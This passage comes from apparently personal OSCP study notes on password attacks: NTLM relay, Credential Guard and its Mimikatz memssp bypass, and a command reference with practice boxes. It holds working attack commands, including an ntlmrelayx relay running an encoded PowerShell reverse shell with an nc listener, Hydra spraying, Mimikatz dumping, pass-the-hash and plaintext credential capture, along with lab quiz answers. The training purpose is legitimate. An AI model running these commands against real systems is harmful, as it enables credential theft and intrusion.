  -t 192.168.50.212 \
  -c "powershell -enc JABjAGwAaQBlAG4AdA..."
# -c runs a command on the target after successful auth (base64-encoded PS reverse shell)
# --no-http-server: we're relaying SMB, not HTTP
# -smb2support: required for modern Windows targets

# In a separate terminal: nc listener for the reverse shell
nc -nvlp 8080

# In a bind shell on the victim machine: trigger authentication to Kali
dir \\<kali-ip>\test
```

> 🔧 **Technique:** the base64-encoded PowerShell reverse shell in the `-c` argument uses Unicode (UTF-16LE) encoding before base64, not plain ASCII. See [[Shells & Payloads (Breakdowns)#PowerShell -enc requires UTF-16LE|Command Breakdowns]] for the encoding mechanics. The IP in the shell payload must be your Kali IP and a port your nc listener is watching.

> 🔁 **Similar to:** the conceptual flow here mirrors the ARP poisoning / MITM concept -- you're inserting yourself into an authentication exchange between two parties. The approach is fundamentally the same as [[Antivirus Evasion#Capstone 2|Capstone 2's]] in-memory delivery: intercept, forward modified content, profit.

> 🔍 **Worth remembering generally:** a relay attack is the correct move when the hash is too complex to crack in the available time. The two techniques (cracking and relaying) are complementary: try to crack first (offline, low noise), switch to relay if cracking fails or takes too long.

> 📸 Screenshot: ntlmrelayx terminal showing "Authenticating against smb://target as USER SUCCEED" then "Executed specified command"
> 📸 Screenshot: nc listener catching the reverse shell and `whoami` confirming `nt authority\system`

**Lab status:** (Q1 + Q2 hands-on)

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Relaying Net-NTLMv2 - VM Group 1 (bind shell on FILES01 as files02admin, relay to FILES02, find flag on files02admin desktop) ⬜ Pending

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Relaying Net-NTLMv2 - VM Group 2 (Capstone: web app on BRUTE2/VM #3 to capture anastasia's hash, relay to FILES02/VM #4, flag on anastasia's Desktop) ⬜ Pending

#### Tags: #NTLMRelay #ntlmrelayx #NetNTLMv2 #impacket #RelayAttack #SMB #Module16

---

### 16.3.5. Windows Credential Guard

Credential Guard is Microsoft's response to Mimikatz-style hash extraction. Understanding it matters because modern Windows enterprise deployments are enabling it by default.

**The architecture:**

```mermaid
flowchart TD
    subgraph Hardware["Physical Hardware (CPU with virtualisation support)"]
        subgraph HV["Hyper-V Hypervisor (highest privilege level)"]
            subgraph VTL1["VTL1 — Virtual Secure Mode Secure World"]
                LSAISO["LSAISO.exe\n(LSA Isolated trustlet)\nStores cached hashes ENCRYPTED\nOnly accessible via hypervisor"]
            end
            subgraph VTL0["VTL0 — Normal World"]
                LSASS["LSASS.exe\n(normal process)\nNo plaintext credentials\nNo unencrypted hashes"]
                KERNEL["Windows Kernel (nt)"]
                PROCS["User processes\nAdmin tools\nMimikatz"]
            end
        end
    end
    PROCS -->|"sekurlsa::logonpasswords"| LSASS
    LSASS -->|"RPC channel"| LSAISO
    PROCS -. "Cannot access VTL1\ndirectly, even as SYSTEM" .-> LSAISO
    style LSAISO fill:#8b0000,color:#fff
    style VTL1 fill:#5d1a1a,color:#fff
```

**Key concepts:**
- **VBS (Virtualization-Based Security):** uses Hyper-V to create isolated memory regions the OS kernel cannot access
- **VSM (Virtual Secure Mode):** the mechanism for isolating VTL1 from VTL0
- **VTL0:** normal Windows environment -- kernel, userland, LSASS.exe. Even SYSTEM-level access lives here
- **VTL1:** isolated secure environment -- LSAISO.exe runs here and holds encrypted copies of cached credentials
- **Credential Guard only protects domain accounts** (non-local). Local account hashes remain in LSASS and are still extractable by Mimikatz

**Checking if Credential Guard is enabled:**
```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning
# Look for "CredentialGuard" in the output
```

**What Mimikatz sees when Credential Guard is active:**
```
msv:
 [00000003] Primary
  * LSA Isolated Data: NtlmHash
    KdfContext: 7862d5bf...
    Tag: 04fe7ed6...
    Encrypted: 6ad53699...
```
The hash is there but encrypted by LSAISO. Mimikatz can read the encrypted blob but cannot decrypt it.

**Bypass: Malicious SSP injection with `misc::memssp`**

Security Support Providers (SSPs) are DLLs that plug into the SSPI authentication framework. LSASS loads them at startup from `HKLM\System\CurrentControlSet\Control\Lsa\Security Packages`. Mimikatz's `memssp` injects a fake SSP directly into LSASS memory without dropping a DLL on disk.

The injected SSP intercepts authentication calls at the SSPI layer, before Credential Guard has a chance to encrypt anything. When a user authenticates (via RDP, local login, etc.), the SSP sees the plaintext credentials and writes them to `C:\Windows\System32\mimilsa.log`.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

# Wait for a user to authenticate (or coerce one to reconnect)
# Then check the log file:
type C:\Windows\System32\mimilsa.log
# [00000000:00af2311] CORP\Administrator  QWERTY123!@#
```

> 🔧 **Technique:** `misc::memssp` requires Administrator privileges and only persists until the system reboots. The credentials log only captures new authentication events after injection -- it won't reveal credentials from sessions that were already open. In a pentest, inject the SSP, then wait (or socially engineer a target to reconnect) and check the log on the next visit.

> 🔍 **Worth remembering generally:** Credential Guard is currently not enabled by default on systems that were updated from an older Windows version -- it only enables by default on fresh installs with modern Windows builds. In practice, most corporate machines you encounter in assessments are long-running and won't have it enabled. But this is changing, and knowing the bypass is important.

> 🔍 **Worth remembering generally:** VBS and Credential Guard require the hypervisor to run at a privilege level above the kernel itself. This is why even SYSTEM access is insufficient to bypass it through normal means -- SYSTEM is in VTL0, and the credentials are in VTL1.

> 📸 Screenshot: `Get-ComputerInfo` output showing `CredentialGuard` in `DeviceGuardSecurityServicesRunning`
> 📸 Screenshot: Mimikatz showing the encrypted "LSA Isolated Data" block instead of a plaintext NTLM hash
> 📸 Screenshot: `mimilsa.log` contents showing captured plaintext domain credentials after SSP injection

**Lab status: ✅ Completed** (Q1-Q4 pure-recall):

| Question | Answer |
|---|---|
| Start VM Group 1 and repeat the steps. What domain does the Administrator user belong to? | **CORP** (the Mimikatz output shows `Domain: CORP` under the Administrator entry) |
| What is the name of the hypervisor developed by Microsoft? | **Hyper-V** |
| In which Virtual Trust Level (VTL) can LSAISO.exe be found? | **VTL1** (the secure/isolated world -- VTL0 is the normal Windows environment) |
| In what format must Security Support Providers be to register in lsass.exe? | **DLL** (SSPs are DLLs loaded by LSASS from the registry key at startup) |

> 🚩 **Hands-on, VM spin-up required:** Password Attacks - Windows Credential Guard - VM Group 1 (RDP as CORP\Administrator to confirm logon, then use memssp bypass on the Credential Guard machine to capture plaintext credentials) ⬜ Pending

#### Tags: #CredentialGuard #VBS #HyperV #VSM #VTL #LSAISO #SSPI #memssp #Mimikatz #Module16

---

## 16.4. Wrapping Up

Password attacks span the full engagement lifecycle.

On **external assessments**, dictionary attacks and spraying against SSH, RDP, and web login forms are often the first viable foothold vector -- much quieter than exploitation and more reliable than hoping for an unpatched CVE.

On **internal assessments**, the Windows-specific material (Mimikatz, pass-the-hash, Responder, relay) is the bread and butter of lateral movement. Most real-world Windows environments still rely on NTLM for backward compatibility, and unsalted NTLM hashes being static makes PtH a durable technique.

The cracking methodology matters outside of password cracking too: extract, format, calculate feasibility, prepare, attack. That disciplined sequence applies any time you're working with data that needs processing before it's useful.

```mermaid
flowchart TD
    Start["Got a target with credentials to attack?"]
    Start --> Q1{Where are\nthe credentials?}

    Q1 -->|"Network service exposed\n(SSH, RDP, HTTP)"| NET["Dictionary / spray attack\nHydra"]
    Q1 -->|"Hash file obtained\n(SAM, database, .kdbx)"| CRACK["Password cracking pipeline\nExtract → Format → hashcat / JtR"]
    Q1 -->|"Windows machine\nwith local admin"| MIM["Mimikatz\nlsadump::sam / sekurlsa::logonpasswords"]
    Q1 -->|"Unprivileged shell\non Windows"| RESP["Responder\ncapture Net-NTLMv2"]

    NET --> VALID["Valid credentials"]
    CRACK --> VALID
    MIM --> HASH["NTLM hash"]
    RESP --> NETHASH["Net-NTLMv2 hash"]

    HASH --> PTH["Pass-the-hash\nimpacket-psexec / wmiexec"]
    NETHASH --> TRY{Can crack it?}
    TRY -->|Yes| VALID
    TRY -->|No| RELAY["Relay attack\nimpacket-ntlmrelayx"]

    VALID --> ACCESS["Access to system / service"]
    PTH --> ACCESS
    RELAY --> ACCESS
    style ACCESS fill:#2e7d32,color:#fff
```

> 🔗 **PayloadsAllTheThings** -- password attacks and credential dumping cheat sheets (GitHub source): [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
> 🔗 **HackTricks** -- Windows credential dumping, Mimikatz, pass-the-hash (GitHub): [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks) -- search "mimikatz" and "pass the hash" within the repo
> 🔗 **Hashcat wiki** -- full list of hash modes and example hashes: [hashcat.net/wiki/doku.php?id=hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)
> 🔗 **Mimikatz project** -- official repo, full command documentation: [github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

#### Tags: #Module16Summary #PasswordAttacks

---

## 📋 Command Reference: Password Attacks

```bash
# --- Network service attacks (Hydra) ---

# Decompress rockyou.txt (first-time setup)
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# SSH dictionary attack: single user, wordlist, non-standard port
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target-ip>

# RDP password spray: user list, single password
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "<password>" rdp://<target-ip>

# HTTP POST form attack
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target-ip> \
  http-post-form "/<path>:<POST_body_with_^PASS^>:<failed_login_indicator>"

# Add usernames to wordlist
echo -e "user1\nuser2" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt

# --- Password cracking fundamentals ---

# Hashcat benchmark (know your hash rates)
hashcat -b

# Calculate keyspace and cracking time
python3 -c "print(62**8)"                           # keyspace for 62-char charset, len 8
python3 -c "print(<keyspace> / <hashrate_per_sec>)" # seconds to exhaust keyspace

# Debug rule mutations (no cracking, just show output)
hashcat -r demo.rule --stdout wordlist.txt

# Crack an MD5 hash with rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force

# Crack with Hashcat's built-in rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force

# --- KeePass ---

keepass2john Database.kdbx > keepass.hash
# Remove "Database:" prefix from keepass.hash before cracking
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# --- SSH private key passphrase ---

ssh2john id_rsa > ssh.hash
# Remove "id_rsa:" prefix from ssh.hash before cracking
hashcat -m 22921 ssh.hash wordlist.txt -r rules.rule --force
# If Hashcat gives "Token length exception" (aes-256-ctr), use JtR instead:
sudo sh -c 'cat /path/to/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash

# --- NTLM (Mimikatz + Hashcat) ---

# Run inside Mimikatz on Windows target (as Administrator):
# privilege::debug
# token::elevate
# lsadump::sam              <- hashes from SAM
# sekurlsa::logonpasswords  <- cached hashes including domain accounts

# Crack NTLM hash on Kali
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force

# --- Pass-the-hash ---

# Access SMB share
smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NT_hash>

# Get SYSTEM shell via PtH
impacket-psexec -hashes 00000000000000000000000000000000:<NT_hash> Administrator@<target>

# Get shell as authenticated user
impacket-wmiexec -hashes 00000000000000000000000000000000:<NT_hash> Administrator@<target>

# --- Net-NTLMv2 capture and cracking ---

# Start Responder
sudo responder -I <interface>

# Trigger auth from victim (in bind shell / code exec on target)
# dir \\<kali-ip>\test

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

# --- Net-NTLMv2 relay ---

# Relay to target, execute reverse shell command
impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip> \
  -c "powershell -enc <base64-PS-reverse-shell>"

# Catch the shell
nc -nvlp <port>

# --- Credential Guard bypass (memssp) ---

# Inside Mimikatz on target with Admin rights:
# privilege::debug
# misc::memssp

# After a user authenticates, read the plaintext credentials:
# type C:\Windows\System32\mimilsa.log

# --- Hash identification ---
hash-identifier <hash>
hashid <hash>
hashcat --help | grep -i "<algorithm>"
```

- **Command Appendix (Password Attacks sections):** *(to be added during hub-doc sync)*
- **Command Breakdowns:** *(Hydra http-post-form syntax, Net-NTLMv2 challenge-response mechanics, Mimikatz privilege chain -- to be added during hub-doc sync)*
- **Decision Tree:** *(credential attack decision nodes -- to be added during hub-doc sync)*
- **Methodology Cheat Sheet:** [[Windows Methodology]] *(password attack phase to be added during hub-doc sync)*
- **Modern Tooling:** [[NetExec]] already covers password spraying across SMB/AD (successor to CrackMapExec -- directly relevant to 16.1.2 and 16.3.x). See [[MODERN TOOLING]].

#### Tags: #CommandReference #Module16

---

## 🎯 Related Boxes to Practice

A note on coverage: network-level brute force (Hydra against SSH/RDP) is often disabled in HTB boxes because it would break the timing of other challenges. The cracking and hash-manipulation techniques in 16.2 and 16.3 are much better represented in public boxes.

---

**NTLM hash extraction and cracking:**

**[HTB Bastion](https://app.hackthebox.com/machines/Bastion)** (Windows, Easy) -- the standout box for this module. An SMB share exposes VHD files (virtual hard disk images). Mounting them reveals a SAM database from a Windows installation, which you extract and crack to get credentials. Exactly the methodology from 16.3.1, applied to a different extraction path (VHD mount rather than Mimikatz). Do this one.

**[HTB Active](https://app.hackthebox.com/machines/Active)** (Windows, Easy) -- already done. The GPP credentials angle and the Kerberoasting technique are adjacent to this module's NTLM cracking content. The hash handling patterns feel the same even though the hash type differs.

---

**Pass-the-hash and lateral movement:**

**[HTB Cascade](https://app.hackthebox.com/machines/Cascade)** (Windows, Medium) -- Windows AD box. Involves credential discovery in LDAP attributes, reused credentials, and lateral movement via recovered hashes. PtH and impacket tools apply directly.

**[HTB SecNotes](https://app.hackthebox.com/machines/SecNotes)** (Windows, Medium) -- credentials stored in a note-taking application. Demonstrates how plaintext passwords end up in unexpected places, the same scenario as 16.2.5's note.txt and dave's password list.

---

**Responder and Net-NTLMv2:**

**[PG Practice: Hutch](https://www.offensive-security.com/labs/)** -- Windows box on the OSCP prep list. Community flagged as involving NTLM authentication capture and credential relay or cracking. Relevant to 16.3.3 and 16.3.4.

**[PG Practice: AuthBy](https://www.offensive-security.com/labs/)** -- explicitly involves authentication brute forcing as a core technique, rare for a public box. Closest thing to a direct Hydra practice target.

> 🔧 **Verify before attempting:** PG Practice VMs update. Check recent community write-ups on the OSCP Discord or OffSec forums before spinning these up to confirm the current technique requirements.

---

**KeePass and credential files:**

No confirmed public HTB box where KeePass cracking is the primary vector (it usually appears as a secondary step). The technique most closely resembles the password manager enumeration in any Windows assessment box where you gain GUI access. The pattern (find .kdbx, keepass2john, crack) is the same regardless of the discovery path.

---

**Finding more:**

> 🔗 **ippsec.rocks** -- search `"mimikatz"`, `"ntlm"`, `"responder"`, `"pass the hash"`, or `"hashcat"` to find boxes where these techniques appeared in context: [ippsec.rocks](https://ippsec.rocks)
> 🔗 **TJNull's OSCP prep list** -- filter for Windows boxes: many of them involve some credential handling, even if password cracking isn't the stated technique

#### Tags: #RelatedBoxes #Module16 #HTBBastion #HTBCascade

---

## **Outstanding Sections**

- [x] **16.1.1 SSH:** done (theory, Hydra flags, quiz N/A, hands-on pending)
- [x] **16.1.2 RDP:** done (theory, password spraying, account lockout risks, hands-on pending)
- [x] **16.1.3 HTTP POST Login Form:** done (theory, Burp capture, Hydra http-post-form syntax, hands-on pending)
- [x] **16.2.1 Introduction to Encryption, Hashes and Cracking:** done (symmetric/asymmetric/hashing, Hashcat benchmark, keyspace/cracking time, all 4 quiz answers including 13-minute cracking time calculation)
- [x] **16.2.2 Mutating Wordlists:** done (rule functions table, same-line vs separate-line rules, --stdout debugging, hash cracking labs pending)
- [x] **16.2.3 Cracking Methodology:** done (5-step flowchart, hash identification quiz answers: SHA-1 and bcrypt)
- [x] **16.2.4 Password Manager:** done (KeePass workflow, keepass2john, mode 13400, hands-on pending)
- [x] **16.2.5 SSH Private Key Passphrase:** done (ssh2john, Hashcat mode 22921, aes-256-ctr JtR fallback, hands-on pending)
- [x] **16.3.1 Cracking NTLM:** done (SAM, SYSKEY, LM vs NTLM, Mimikatz privilege chain, mode 1000, hands-on pending)
- [x] **16.3.2 Passing NTLM:** done (PtH mechanics, UAC remote restrictions, smbclient/psexec/wmiexec, hands-on pending)
- [x] **16.3.3 Cracking Net-NTLMv2:** done (challenge-response diagram, Responder, mode 5600, LLMNR poisoning note, hands-on pending)
- [x] **16.3.4 Relaying Net-NTLMv2:** done (relay attack sequence diagram, ntlmrelayx, hands-on pending)
- [x] **16.3.5 Windows Credential Guard:** done (VBS/VSM/VTL architecture diagram, memssp bypass, mimilsa.log, all 4 quiz answers)
- [x] **16.4 Wrapping Up:** done (decision flowchart, external resources)

**Module 16 theory and quiz answers are fully written. All hands-on labs remain pending (VM spin-up required). Ready to begin hands-on labs per [[feedback_oscp_lab_workflow]].**
